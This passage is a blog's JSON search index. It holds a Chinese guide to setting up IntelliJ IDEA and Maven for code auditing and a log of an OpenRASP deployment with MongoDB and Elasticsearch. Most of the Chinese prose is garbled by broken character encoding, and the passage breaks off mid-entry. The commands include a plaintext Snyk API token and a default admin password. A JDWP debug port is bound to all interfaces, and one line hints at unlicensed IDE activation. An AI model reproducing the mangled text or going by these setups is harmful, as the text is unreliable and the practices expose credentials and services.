[{"content":"IDEAæ•™ç¨‹-1\nIDEAæ•™ç¨‹-2\nIDEA-Topics\nå®‰è£…IDEA \u0026amp; Maven 1  brew install intellij-idea maven   License Server-fofa\nActivation Online\næ–‡ç« çš„éƒ¨åˆ†å†…å®¹è¢«å¯†ç ä¿æŠ¤ï¼š\n  --- DON'T MODIFY THIS LINE --- é…ç½®JDK  åä¸ºJDKæº Zulu JDK  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  wget -P /tmp/ -O zulu8.tar.gz https://cdn.azul.com/zulu/bin/zulu8.52.0.23-ca-fx-jdk8.0.282-macosx_aarch64.tar.gz sudo tar -zxvf /tmp/zulu8.tar.gz zulu8.52.0.23-ca-fx-jdk8.0.282-macosx_aarch64/zulu-8.jdk sudo mv /tmp/zulu8.*/zulu-8.jdk /Library/Java/JavaVirtualMachines wget -P /tmp -O zulu11.tar.gz https://cdn.azul.com/zulu/bin/zulu11.56.19-ca-fx-jdk11.0.15-macosx_aarch64.tar.gz sudo tar -zxvf /tmp/zulu11.tar.gz sudo mv /tmp/zulu11.*/zulu-11.jdk /Library/Java/JavaVirtualMachines cat \u0026lt;\u0026lt;EOF \u0026gt;\u0026gt; $HOME/.zshrc jdk(){ echo \u0026#34; \u0026gt;\u0026gt;\tUsage: jdk [-v version] \u0026#34; unset JAVA_HOME; export JAVA_HOME=`/usr/libexec/java_home $@`; echo \u0026#34;JAVA_HOME:\u0026#34; $JAVA_HOME java -version } EOF   é…ç½®Maven IDEAè‡ªå¸¦é…ç½®æ–‡ä»¶ /Applications/IntelliJ IDEA.app/Contents/plugins/maven/lib/maven3/conf\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57  mkdir $HOME/.m2 cat \u0026lt;\u0026lt;EOF \u0026gt; $HOME/.m2/settings.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;settings xmlns=\u0026#34;http://maven.apache.org/SETTINGS/1.0.0\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://maven.apache.org/SETTINGS/1.0.0 http://maven.apache.org/xsd/settings-1.0.0.xsd\u0026#34;\u0026gt; \u0026lt;localRepository\u0026gt;/Users/ding.fugui/.m2/repository\u0026lt;/localRepository\u0026gt; \u0026lt;mirrors\u0026gt; \u0026lt;mirror\u0026gt; \u0026lt;id\u0026gt;**-nexus\u0026lt;/id\u0026gt; \u0026lt;mirrorOf\u0026gt;*\u0026lt;/mirrorOf\u0026gt; \u0026lt;url\u0026gt;https://maven.bitget.tools/repository/maven-public\u0026lt;/url\u0026gt; \u0026lt;/mirror\u0026gt; \u0026lt;/mirrors\u0026gt; \u0026lt;profiles\u0026gt; \u0026lt;profile\u0026gt; \u0026lt;id\u0026gt;example-nexus\u0026lt;/id\u0026gt; \u0026lt;properties\u0026gt; \u0026lt;maven.compiler.source\u0026gt;1.8\u0026lt;/maven.compiler.source\u0026gt; \u0026lt;maven.compiler.target\u0026gt;1.8\u0026lt;/maven.compiler.target\u0026gt; \u0026lt;maven.compiler.compilerVersion\u0026gt;1.8\u0026lt;/maven.compiler.compilerVersion\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;repositories\u0026gt; \u0026lt;repository\u0026gt; \u0026lt;id\u0026gt;central\u0026lt;/id\u0026gt; \u0026lt;url\u0026gt;https://maven.example.com/repository/maven-central/\u0026lt;/url\u0026gt; \u0026lt;releases\u0026gt; \u0026lt;enabled\u0026gt;true\u0026lt;/enabled\u0026gt; \u0026lt;/releases\u0026gt; \u0026lt;snapshots\u0026gt; \u0026lt;enabled\u0026gt;true\u0026lt;/enabled\u0026gt; \u0026lt;updatePolicy\u0026gt;always\u0026lt;/updatePolicy\u0026gt; \u0026lt;/snapshots\u0026gt; \u0026lt;/repository\u0026gt; \u0026lt;/repositories\u0026gt; \u0026lt;pluginRepositories\u0026gt; \u0026lt;pluginRepository\u0026gt; \u0026lt;id\u0026gt;central\u0026lt;/id\u0026gt; \u0026lt;url\u0026gt;https://maven.example.com/repository/maven-central/\\\u0026lt;/url\u0026gt; \u0026lt;releases\u0026gt; \u0026lt;enabled\u0026gt;true\u0026lt;/enabled\u0026gt; \u0026lt;/releases\u0026gt; \u0026lt;snapshots\u0026gt; \u0026lt;enabled\u0026gt;true\u0026lt;/enabled\u0026gt; \u0026lt;/snapshots\u0026gt; \u0026lt;/pluginRepository\u0026gt; \u0026lt;/pluginRepositories\u0026gt; \u0026lt;/profile\u0026gt; \u0026lt;/profiles\u0026gt; \u0026lt;activeProfiles\u0026gt; \u0026lt;activeProfile\u0026gt;example-nexus\u0026lt;/activeProfile\u0026gt; \u0026lt;/activeProfiles\u0026gt; \u0026lt;/settings\u0026gt; EOF mvn   IDEA åå¥½è®¾ç½® é’ˆå¯¹å…¨å±€é…ç½® æ‰“å¼€åå¥½è®¾ç½®\nAppearance \u0026amp; Behavior System Settings Keymap https://cdk8s.gitbook.io/github/keymap-mac-introduce\nå¸¸ç”¨å¿«æ·é”®    Ctrl+h æŸ¥çœ‹å½“å‰ç±»çš„å±‚æ¬¡ç»“æ„      Command+7 / Cmd+F12 æŸ¥çœ‹ç±»ç»“æ„    Command+O å¿«é€Ÿæœç´¢ç±»    Ctrl+O Override æ–¹æ³•    (Shift +)Command +F (å…¨å±€)å½“å‰æ–‡ä»¶å…³é”®å­—æ£€ç´¢    Command+Alt +B æŸ¥çœ‹æ–¹æ³•/ç±»çš„å®ç°ç±»    Alt + F7 æŸ¥çœ‹è°ƒç”¨é“¾(æ–¹æ³•è¢«è°ƒç”¨çš„æƒ…å†µ) Find Usages   Command+E æŸ¥çœ‹æœ€è¿‘ä½¿ç”¨çš„æ–‡ä»¶    Shift+ Alt+Command+U æŸ¥çœ‹å¯è§†åŒ–ç±»ç»§æ‰¿é“¾    Command+/ è¡Œæ³¨é‡Š Shift+Command+/ å—æ³¨é‡Š   /** æ–¹æ³•/ç±»æ³¨é‡Š å¯è‡ªå®šä¹‰ç±»æ¨¡æ¿    å¯è§†åŒ–ç±»ç»§æ‰¿é“¾\nEditor Editor-\u0026gt;General   è‡ªåŠ¨å¯¼å…¥\n  Appearnace\n  Code Completion  Editor Tabs  Postfix Completion varå£°æ˜ nullåˆ¤ç©º notnullåˆ¤éç©º nnåˆ¤éç©º foréå† foriå¸¦ç´¢å¼•çš„éå† notå–å ifæ¡ä»¶åˆ¤æ–­ castå¼ºè½¬ returnè¿”å›å€¼ Editro-\u0026gt;Code Editing Font Color Scheme Code Style Inspections å„ç±»æ–‡ä»¶ç±»å‹å›¾æ ‡ File and Code Templates  File Header    Class\n  Interface\n  Enum\n  File Encodings BOMï¼ˆbyte-order markï¼‰ï¼Œå³å­—èŠ‚é¡ºåºæ ‡è®°ï¼Œå®ƒæ˜¯æ’å…¥åˆ°ä»¥UTF-8ã€UTF16æˆ–UTF-32ç¼–ç Unicodeæ–‡ä»¶å¼€så¤´çš„ç‰¹æ®Šæ ‡è®°ï¼Œç”¨æ¥è¯†åˆ«Unicodeæ–‡ä»¶çš„ç¼–ç ç±»å‹ã€‚å¯¹äºUTF-8æ¥è¯´ï¼ŒBOMå¹¶ä¸æ˜¯å¿…é¡»çš„ï¼Œå› ä¸ºBOMç”¨æ¥æ ‡è®°å¤šå­—èŠ‚ç¼–ç æ–‡ä»¶çš„ç¼–ç ç±»å‹å’Œå­—èŠ‚é¡ºåºï¼ˆbig-endianæˆ–little-endianï¼‰ã€‚\nã€€ä¸å«BOMçš„UTF-8æ‰æ˜¯æ ‡å‡†å½¢å¼ï¼ŒUTF-8ä¸éœ€è¦BOM\nå¸¦BOMçš„UTF-8æ–‡ä»¶çš„å¼€å¤´ä¼šæœ‰U+FEFFï¼Œæ‰€ä»¥æˆ‘æ–°å»ºçš„ç©ºæ–‡ä»¶ä¼šæœ‰3å­—èŠ‚çš„å¤§å°ã€‚\nLive Templates File Types éšè—é¡¹ç›®ä¸­ .ideaç›®å½•\nInlay Hints -Java Copyright Plugins å¸¸ç”¨æ’ä»¶ Theme - One Dark/ Nord / Xcode-Dark Dash Edutool Stackoverflow æ—¶åºå›¾-SequenceDigram Java Visualizer å¿«æ·é”®å±•ç¤ºPresentation Assistant é˜¿é‡Œå·´å·´ Java ä»£ç è§„èŒƒ- Alibaba Java Code Guidelines MybatisX é«˜æ•ˆæ“ä½œMybatisæ’ä»¶ Mybatis-log-plugin Codotaâ€” ä»£ç æ™ºèƒ½æç¤º å¿…å¤‡çš„ç¿»è¯‘æ’ä»¶-Translation GitToolBox-æ˜¾ç¤ºä»£ç æäº¤æ—¶é—´ Key Promoter X å¿«æ·é”®æç¤ºæ’ä»¶ Rainbow Brackets â€”â€”è®©ä½ çš„æ‹¬å·å˜æˆä¸ä¸€æ ·çš„é¢œè‰²ï¼Œé˜²æ­¢é”™ä¹±æ‹¬å· Leetcode Editor å¯ä»¥åœ¨IDEAä¸­åœ¨çº¿åˆ·é¢˜ã€‚ Java Stream Debugger â€”â€” Stream å°†æ“ä½œæ­¥éª¤å¯è§†åŒ– Lombok Maven Helper arthas idea JRebel \u0026amp; XRebelçƒ­éƒ¨ç½²æ’ä»¶ å®‰å…¨æ’ä»¶ SpotBugs https://github.com/find-sec-bugs/find-sec-bugs/wiki/IntelliJ-Tutorial\nBlack Duck SCA WhiteSource Advise Momo Code Sec Inspector Java Decompiler(JD-GUI) Jadx Android Decompiler Snyk  Dependency Analytics  CMDæ¨¡å¼ 1 2  brew tap snyk/tap \u0026amp;\u0026amp; brew install snyk snyk config set api c70b7d5a-1a74-44df-b52c-3ab5c80d12e6   IDEæ¨¡å¼ å…ˆé…ç½®JAVA_HOME\n1 2 3 4 5 6  echo \u0026#39; ## JDK export JAVA_HOME=/Library/Java/JavaVirtualMachines/zulu-8.jdk/Contents/Home export PATH=$JAVA_HOME/bin:$PATH \u0026#39; \u0026gt;\u0026gt; ~/.zshrc   jclasslib bytecode viewer æŸ¥çœ‹å­—èŠ‚ç  Jadx Android Decompiler RIPS Security Analysis Restful Fast Requestâ€”â€”IDEAç‰ˆPostman Restful Fast Request\nMurphySec Code Scan SonarLint ä»£ç è´¨é‡æ£€æŸ¥æ’ä»¶ Version Control ä¸Gitlabé›†æˆ-æ’ä»¶ Build, Excution,Deployment Maven Maven home directoryï¼šMaven ä¸»è·¯å¾„è®¾ç½®ï¼ŒIDEA éå¸¸å¼ºå¤§ï¼Œè‡ªå¸¦äº†å¤šä¸ªç‰ˆæœ¬çš„ Maven æ’ä»¶ï¼Œé€‰æ‹©å¦‚ Bundled (Maven 3) è¡¨ç¤ºé€‰æ‹© IDEA è‡ªå¸¦çš„ Maven æ’ä»¶ï¼Œå®ƒå…¶å®çš„è·¯å¾„æ˜¯Â /Applications/IntelliJ IDEA.app/Contents/plugins/maven/lib/maven3ï¼Œä¹Ÿå¯ä»¥é€‰æ‹©è‡ªå®šä¹‰å®‰è£…çš„ Maven è·¯å¾„ã€‚\nUser settings fileï¼šé…ç½® Maven æºæ–‡ä»¶çš„é…ç½®è·¯å¾„ï¼Œä¸€èˆ¬é»˜è®¤é…ç½®ä¸ºå½“å‰ç”¨æˆ·ç›®å½•ä¸‹çš„Â {user.home}/.m2/settings.xmlã€‚\nLocal repositoryï¼šé…ç½®æœ¬åœ°ä»“åº“è·¯å¾„ï¼Œé»˜è®¤é…ç½®ä¸ºå½“å‰ç”¨æˆ·ç›®å½•ä¸‹çš„Â {user.home}/.m2/repositoryã€‚\nCompiler Debug å½“è°ƒç”¨ConcurrentLinkedQueueç±»çš„toString()æ–¹æ³•æ—¶ä¼šè·å–é˜Ÿåˆ—çš„è¿­ä»£å™¨ï¼Œè€Œåˆ›å»ºè¿­ä»£å™¨æ—¶ä¼šè°ƒç”¨é˜Ÿåˆ—çš„first()æ–¹æ³•ï¼Œåœ¨first()æ–¹æ³•é‡Œä¼šä¿®æ”¹headçš„å±æ€§ï¼Œä»è€Œå¯¼è‡´è¾“å‡ºçš„ç»“æœä¸ä¸€è‡´\nåœ¨è¿œç¨‹è°ƒè¯•æ—¶ï¼Œæˆ‘ä»¬å‘ç°æœ‰äº›ç±»çš„æ–­ç‚¹ä¸€ç›´æ–­ä¸ä¸Šé—®é¢˜ï¼Œè¯¥é—®é¢˜å¯èƒ½å‡ºåœ¨ IntelliJ çš„ Settings -\u0026gt; Debugger -\u0026gt; Stepping é…ç½®ä¸Šã€‚è‹¥å‹¾é€‰äº† Do not step into the classesï¼Œåˆ™ä¼šè®©è¿™äº›æ–­ç‚¹å¤±æ•ˆ:\næœ¬åœ°è°ƒè¯• è¿œç¨‹è°ƒè¯• addressæœ€å¥½æŒ‡å®šä¸º \u0026lt;IP\u0026gt;:\u0026lt;Port\u0026gt;å½¢å¼\n-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=0.0.0.0:5005\nå¯¹ç¬¬ä¸‰æ–¹jaråŒ…è¿›è¡Œè°ƒè¯•   åˆ›å»ºå·¥ç¨‹ï¼Œå°†jaråŒ…æ·»åŠ åˆ°ä¾èµ–åº“ä¸­\n  åœ¨Mainå‡½æ•°å¤„æ‰“æ–­ç‚¹ï¼Œæ·»åŠ è°ƒè¯•é…ç½®ï¼Œè¿è¡Œç¨‹åºï¼Œç‚¹å‡»debug\n  https://cdk8s.gitbook.io/github/debug-introduce\nLanguage \u0026amp; Frameworks Tools Setting Repository- ä½¿ç”¨gitä»“åº“ä¿å­˜Ideaé…ç½®æ–‡ä»¶Settings Access-Token\nAdvanced Settings Other Settings ä»£ç å¯¹æ¯”æ•ˆæœå›¾\nSettings Import/Export  å¯¼å‡ºé…ç½®   å¦‚ä½•æ¸…é™¤æ‰€æœ‰é¡¹ç›®ç¼“å­˜ File \u0026gt; Invalideate Caches / Restart æ¸…é™¤ç¼“å­˜å¹¶é‡å¯\né’ˆå¯¹æ¨¡å—æ‰“jaråŒ… https://blog.csdn.net/linxiyimeng/article/details/86491422\n ","description":"ä»£ç å®¡è®¡ç¯å¢ƒé…ç½®","id":0,"section":"dso","tags":null,"title":"ä»£ç å®¡è®¡ç¯å¢ƒé…ç½®-1","uri":"http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/01-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"content":"Markdown here\n","description":"test post","id":1,"section":"red","tags":null,"title":"January 2019","uri":"http://crkmythical.github.io/red/2019_january/"},{"content":"Beijing: â˜ï¸ ğŸŒ¡ï¸+23Â°C ğŸŒ¬ï¸â†–11km/h\nOpenRASPéƒ¨ç½²è®°å½•  Raspå®˜æ–¹æµ‹è¯•ç”¨ä¾‹  openRaspå®‰è£… ç›¸å…³è½¯ä»¶\n rasp-cloud.tar.gz openraspç®¡ç†åå° MongoDB Version \u0026gt;= 3.6 ç”¨æ¥å­˜å‚¨åº”ç”¨ã€è´¦å·å¯†ç ç­‰ä¿¡æ¯ã€‚ ElasticSearch 5.6 \u0026lt;= Version \u0026lt; 7.0 ç”¨æ¥å­˜å‚¨æŠ¥è­¦å’Œç»Ÿè®¡ä¿¡æ¯  Centos7 yumæºé…ç½®\n1 2 3 4  rmÂ -rfÂ /etc/yum.repos.d/*.repoÂ #åˆ é™¤repoæ–‡ä»¶ï¼Œæˆ–è€…è‡ªå·±å¤‡ä»½ curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo curl -o /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo yumÂ makecacheÂ #æ›´æ–°ç¼“å­˜   æ›´æ”¹rmpdbè·¯å¾„ï¼Œé˜²æ­¢å‡ºç°rmpdbè¿‡å¤§é”™è¯¯\n1 2 3 4 5 6  mkdir /var/lib/rpm/backup cp -a /var/lib/rpm/__db* /var/lib/rpm/backup/ rm -f /var/lib/rpm/__db.[0-9][0-9]* rpm --quiet -qa rpm --rebuilddb yum clean all   æ­å»ºMongoDBæœåŠ¡ 1 2 3 4 5 6 7 8 9 10 11  yum update cat \u0026lt;\u0026lt;EOF \u0026gt; /etc/yum.repos.d/mongodb-org-4.2.repo [mongodb-org-4.2] name=MongoDB Repository baseurl=https://repo.mongodb.org/yum/redhat/$releasever/mongodb-org/4.2/x86_64/ gpgcheck=1 enabled=1 gpgkey=https://www.mongodb.org/static/pgp/server-4.2.asc EOF yum install -y mongodb-org   é…ç½®å¯åŠ¨MongoDB mongodbé…ç½®æ–‡ä»¶è·¯å¾„ /etc/mongod.conf\n1 2 3 4 5  ulimit 64000 # å¯åŠ¨mongodbæœåŠ¡ systemctl enable --now mongod # æŸ¥çœ‹mongodbç«¯å£æ˜¯å¦æ­£å¸¸ netstat -antlp | grep 27017   æ­å»ºElasticsearchæœåŠ¡ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  # å®‰è£…JDK sudo yum -y install java-1.8.0-openjdk java-1.8.0-openjdk-devel # é…ç½®Java HOME cat \u0026lt;\u0026lt;EOF | sudo tee /etc/profile.d/java8.sh export JAVA_HOME=/usr/lib/jvm/jre-openjdk export PATH=\\$PATH:\\$JAVA_HOME/bin export CLASSPATH=.:\\$JAVA_HOME/jre/lib:\\$JAVA_HOME/lib:\\$JAVA_HOME/lib/tools.jar EOF # æ›´æ–°ç¯å¢ƒå˜é‡ source /etc/profile.d/java8.sh # é…ç½®elasticsearch 6æº cat \u0026lt;\u0026lt;EOF | sudo tee /etc/yum.repos.d/elasticsearch.repo [elasticsearch-6.x] name=Elasticsearch repository for 6.x packages baseurl=https://artifacts.elastic.co/packages/oss-6.x/yum gpgcheck=1 gpgkey=https://artifacts.elastic.co/GPG-KEY-elasticsearch enabled=1 autorefresh=1 type=rpm-md EOF yum install -y elasticsearch-oss # è°ƒèŠ‚jvm `/etc/elasticsearch/jvm.options` -Xms256m/-Xmx512m # å¯åŠ¨elasticsearchæœåŠ¡ sudo systemctl enable --now elasticsearch # æµ‹è¯•elasticsearchæœåŠ¡æ˜¯å¦æ­£æ­£å¸¸ curl http://127.0.0.1:9200   openRaspç®¡ç†åå°éƒ¨ç½²rasp-cloud 1 2 3 4  # åˆ¤æ–­wgetæ˜¯å¦å­˜åœ¨åå†ç»§ç»­ wget https://github.com/baidu/openrasp/releases/download/v1.3.7/rasp-cloud.tar.gz # è§£å‹rasp-cloud tar -zxvf rasp-cloud.tar.gz   é…ç½®rasp-cloud ç¼–è¾‘Â conf/app.confÂ æ–‡ä»¶ï¼Œä¿®æ­£ ElasticSearch å’Œ MongoDB ä¸¤ä¸ªæœåŠ¡å™¨çš„åœ°å€ã€‚å¦‚æœè¿™ä¸¤ä¸ªæ•°æ®åº“éƒ½å®‰è£…åœ¨äº†æœ¬æœºï¼Œä¸”ä½¿ç”¨é»˜è®¤ç«¯å£\n1 2 3 4 5 6 7  [prod]EsAddr = http://127.0.0.1:9200EsUser =EsPwd =MongoDBAddr = 127.0.0.1:27017MongoDBUser =MongoDBPwd =  å¯åŠ¨rasp-cloud 1 2 3 4 5 6 7 8  ./rasp-cloud -d /opt/rasp-cloud-2022-01-28/ 2022/06/17 03:02:30.786 [I] [environment.go:70] Version: 1.3.7 2022/06/17 03:02:30.786 [I] [environment.go:75] Build Time: 2022-01-28 17:50:39 2022/06/17 03:02:30.786 [I] [environment.go:78] Git Commit ID: a0634d6ea7c170284c262c757e56a7e5a8f242d0 2022/06/17 03:02:30.786 [I] [environment.go:299] Command line arguments: [] 2022/06/17 03:02:32.789 [I] [environment.go:272] start successfully, for details please check the log in /opt/rasp-cloud-2022-01-28/logs/api/agent-cloud.log   åœ¨æµè§ˆå™¨é‡Œæ‰“å¼€Â http://your-ip:8086ï¼Œç™»å½•ç®¡ç†åå°ã€‚\nå…¶ä¸­ç”¨æˆ·åå›ºå®šä¸ºÂ openraspï¼Œåˆå§‹å¯†ç ä¸ºÂ admin@123ã€‚\nå¦‚æœä¸èƒ½è®¿é—®ï¼Œè¯·æ£€æŸ¥é˜²ç«å¢™è®¾ç½®ï¼Œæˆ–è€…æ£€æŸ¥Â logs/api/agent-cloud.logÂ ä¸‹é¢çš„é”™è¯¯ä¿¡æ¯ã€‚\næ£€æŸ¥åå°çŠ¶æ€ 1 2 3 4  ./rasp-cloud -s status /data/openrasp/rasp-cloud/ 2022/06/20 10:27:57.836 [I] [environment.go:70] Version: 1.3.6 2022/06/20 10:27:57 rasp-cloud is already running   OpenRASPåå°è´Ÿè½½å‡è¡¡ ç®¡ç†åå° åˆ†ä¸ºä¸¤ç§ç±»å‹:\n Agent æ¥å£æœåŠ¡å™¨ (AgentServer)Â ç”¨äºè·Ÿagenté€šä¿¡ï¼Œæ¯”å¦‚å¿ƒè·³ã€æ—¥å¿—ä¸Šä¼ ï¼Œå¯ä»¥éƒ¨ç½²å¤šä¸ª å‰ç«¯æœåŠ¡å™¨ (PanelServer) ç”¨äºå±•ç¤ºæ•°æ®ã€å®šæ—¶æŠ¥è­¦ã€ä¿®æ”¹é…ç½®ï¼Œç”¨æˆ·å¯è®¿é—®,éƒ¨ç½²å¤šä¸ªä¼šæœ‰é‡å¤æŠ¥è­¦çš„é—®é¢˜ï¼Œæ‰€ä»¥ç›®å‰åªèƒ½éƒ¨ç½²ä¸€ä¸ªã€‚   å¯åŠ¨ä¸€ä¸ª å‰ç«¯ æœåŠ¡å™¨ï¼Œ  ./rasp-cloud -type=panel -d ç„¶ååœ¨ä¸åŒçš„æœºæˆ¿ï¼Œåˆ†åˆ«å¯åŠ¨ä¸€ä¸ª agent æœåŠ¡å™¨ï¼ˆä½¿ç”¨åŒä¸€ä»½ conf/app.conf é…ç½®æ–‡ä»¶å³å¯ï¼‰\n./rasp-cloud -type=agent -d æœåŠ¡å™¨éƒ¨ç½²å®Œæˆåï¼Œè¯·æ ¹æ®Â ç®¡ç†åå° - è®¾ç½®åå°ä¿¡æ¯Â æ–‡æ¡£ï¼Œå°†æ‰€æœ‰çš„AgentæœåŠ¡å™¨å¡«å…¥ã€‚ä¹‹åå°±å¯ä»¥åœ¨Â æ·»åŠ ä¸»æœºÂ ç•Œé¢ä¸Šï¼Œç”Ÿæˆè‡ªåŠ¨å®‰è£…å‘½ä»¤äº†ã€‚\nå®¹é‡è¯´æ˜: ç›®å‰ï¼Œåœ¨2æ ¸4GBçš„ä¸»æœºä¸Šï¼ŒæŒ‰ç…§3åˆ†é’Ÿä¸€ä¸ªå¿ƒè·³è®¡ç®—ï¼Œå¤§æ¦‚å•å°æœºå™¨å¯å®¹çº³Â 1000ä¸ªÂ å®¢æˆ·ç«¯ã€‚\nElasticSearch è´Ÿè½½å‡è¡¡ åœ¨ä½¿ç”¨ESé›†ç¾¤æ—¶ï¼ŒEsAddr å¡«å†™ä¸€ä¸ªæœåŠ¡å™¨çš„åœ°å€å³å¯ã€‚æˆ‘ä»¬è‡ªåŠ¨ä¼šè°ƒç”¨Â /_nodes/Â æ¥å£è·å–å…¨éƒ¨æœåŠ¡å™¨ä¿¡æ¯å¹¶è½®è¯¢ï¼Œä»¥é¿å…å•ç‚¹é—®é¢˜ã€‚\n[å¯é€‰] å¼€å¯HTTPS åœ¨ conf/app.conf ä¸­åŠ å…¥ä»¥ä¸‹é…ç½®å³å¯ï¼Œä¿®æ”¹åé‡å¯åå°ç”Ÿæ•ˆ:\n1 2 3 4 5  EnableHTTPS = trueEnableHttpTLS = trueHttpsPort = 443HTTPSCertFile = \u0026#34;cert.pem\u0026#34;HTTPSKeyFile = \u0026#34;cert.key\u0026#34;  åå°å‡çº§ æŸ¥çœ‹rasp-cloudç‰ˆæœ¬, ç‰ˆæœ¬é«˜äº1.3.0 çš„åå°ï¼ŒæŒ‰å¦‚ä¸‹å‡çº§ç­–ç•¥è¿›è¡Œå‡çº§\n1 2 3 4 5  ./rasp-cloud -version /rasp-cloud/ Version: 1.3 Build Time: 2020-02-11 17:56:52 Git Commit ID: d6902d60f8874e7255562544041edbd340e6b676    å¤‡ä»½åŸæ¥çš„é…ç½®æ–‡ä»¶ conf/app.conf ä¸‹è½½æ–°çš„å®‰è£…åŒ…,è§£å‹åˆ°ç›¸åŒçš„ç›®å½• æ’ä»¶æ˜¯å¦éœ€è¦æ›´æ–°é…ç½®æ–‡ä»¶ æ‰§è¡Œ /path/to/rasp-cloud -s restart æ£€æŸ¥åå°æ˜¯å¦å¯ä»¥æ­£å¸¸è®¿é—®  é‡ç½®åå°å¯†ç  è¯·ç™»å½•åˆ°åå°æ‰€åœ¨çš„ä¸»æœºï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œæ ¹æ®æç¤ºé‡ç½®å¯†ç ã€‚\n1  ./rasp-cloud -type=reset   å®šæœŸå¤‡ä»½ ä»¥å°æ—¶çº§åˆ«å¯¹ MongoDB å’Œ ElasticSearch æ•°æ®åº“è¿›è¡Œå¤‡ä»½\nMongoDB éœ€è¦å¤‡ä»½Â openraspÂ æ•°æ®åº“ å¯ä»¥ä½¿ç”¨ mongodump + mongorestore å®ç°\n å¤‡ä»½  1 2 3 4 5 6 7  mongodump -h IP --port ç«¯å£ [-u ç”¨æˆ·å -p å¯†ç ] -d openrasp -o /data/backups/mongdb eg: mongodump -h localhost:27017 -d openrasp -o /tmp/mongodb -hï¼šMongDBæ‰€åœ¨æœåŠ¡å™¨åœ°å€ï¼Œå¦‚ localhost:27017 -dï¼šå¤‡ä»½çš„æ•°æ®åº“ -cï¼šå¤‡ä»½çš„æ•°æ®è¡¨ -oï¼šå¤‡ä»½çš„æ•°æ®å­˜æ”¾ç›®å½•    æ¢å¤  1 2 3 4 5 6 7 8  mongorestore -h IP --port ç«¯å£ -u ç”¨æˆ·å -p å¯†ç  -d æ•°æ®åº“ --drop å¤‡ä»½æ–‡ä»¶å­˜åœ¨è·¯å¾„ eg: mongorestore -h localhost:27017 -d openrasp --drop /tmp/mongodb/openrasp/ - hï¼šMongDBæ‰€åœ¨æœåŠ¡å™¨åœ°å€ï¼Œå¦‚ localhost:27017 - dï¼šéœ€è¦æ¢å¤çš„æ•°æ®åº“ - drop: æ¢å¤çš„æ—¶å€™ï¼Œå…ˆåˆ é™¤å½“å‰æ•°æ®ï¼Œç„¶åæ¢å¤å¤‡ä»½çš„æ•°æ®ã€‚ - cï¼šéœ€è¦æ¢å¤çš„æ•°æ®è¡¨ - \u0026lt;path\u0026gt;ï¼šmongorestore æœ€åçš„ä¸€ä¸ªå‚æ•°ï¼Œå¤‡ä»½æ•°æ®æ‰€åœ¨ä½ç½®/tmp/mongodb/openrasp/   ElasticSearch éœ€è¦å¤‡ä»½å¦‚ä¸‹ç´¢å¼•ï¼Œå¯ä»¥ç”¨ snapshot æ–¹å¼å¤‡ä»½ real-openrasp-report-data-{appid} real-openrasp-attack-alarm-{appid} real-openrasp-policy-alarm-{appid} real-openrasp-error-alarm-{appid} real-openrasp-dependency-data-{appid}  å‚è€ƒå¤‡ä»½æ–¹æ³•\n  é…ç½®å¤‡ä»½ä»“åº“è·¯å¾„  1 2 3 4  mkdir -p /data/backups/elasticsearch chmod 755 /data/backups/elasticsearch echo \u0026#39;path.repo: /data/backups/elasticsearch\u0026#39; \u0026gt;\u0026gt; /etc/elasticsearch/elasticsearch.yml systemctl restart elasticsearch   åˆ›å»ºä»“åº“\nå¤‡ä»½æ•°æ®ä¹‹å‰ï¼Œè¦åˆ›å»ºä¸€ä¸ªä»“åº“æ¥ä¿å­˜æ•°æ®ï¼Œä»“åº“çš„ç±»å‹æ”¯æŒShared filesystem, Amazon S3, HDFSã€Azure Cloudé€‰æ‹©ã€‚\nåˆ›å»ºäº†ä¸€ä¸ªå¤‡ä»½ä»“åº“åä¸º datasvr\nå­˜å‚¨ç›®å½•ä¸º/data/backups/elasticsearch çš„å¤‡ä»½ä»“åº“ã€‚  1 2 3 4 5 6 7 8  curl -H \u0026#34;Content-Type: application/json\u0026#34; -X PUT \u0026#39;http://127.0.0.1:9200/_snapshot/datasvr\u0026#39; -d \u0026#39; { \u0026#34;type\u0026#34;: \u0026#34;fs\u0026#34;, \u0026#34;settings\u0026#34;: { \u0026#34;location\u0026#34;: \u0026#34;/data/backups/elasticsearch\u0026#34;, \u0026#34;compress\u0026#34;: true } }\u0026#39;   æ‰‹åŠ¨åˆ›å»ºå¿«ç…§(å¤‡ä»½ç´¢å¼•)  1 2 3 4 5 6  url -H \u0026#34;Content-Type:application/json\u0026#34; -X PUT \u0026#39;http://127.0.0.1:9200/_snapshot/datasvr/snapshot_1?wait_for_completion=true\u0026#39; -d \u0026#39; \u0026#34;indices\u0026#34;: \u0026#34;index_1,index_2\u0026#34; \u0026#39; # æŸ¥è¯¢ curl -X GET \u0026#34;http://127.0.0.1:9200/_snapshot/backup/snapshot_1?pretty\u0026#34;   è‡ªåŠ¨å¤‡ä»½  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  # é…ç½®è‡ªåŠ¨å¤‡ä»½å‚æ•° curl -H \u0026#39;Content-Type: application/json\u0026#39; -X PUT \u0026#34;http://127.0.0.1:9200/_slm/policy/everyday-snapshots?pretty\u0026#34; -d\u0026#39; { \u0026#34;schedule\u0026#34;: \u0026#34;0 30 1 * * ?\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;%3ceveryday-snap-%7bnow%2fd%7d%3e\u0026#34;, \u0026#34;repository\u0026#34;: \u0026#34;datasvr\u0026#34;, \u0026#34;config\u0026#34;: { 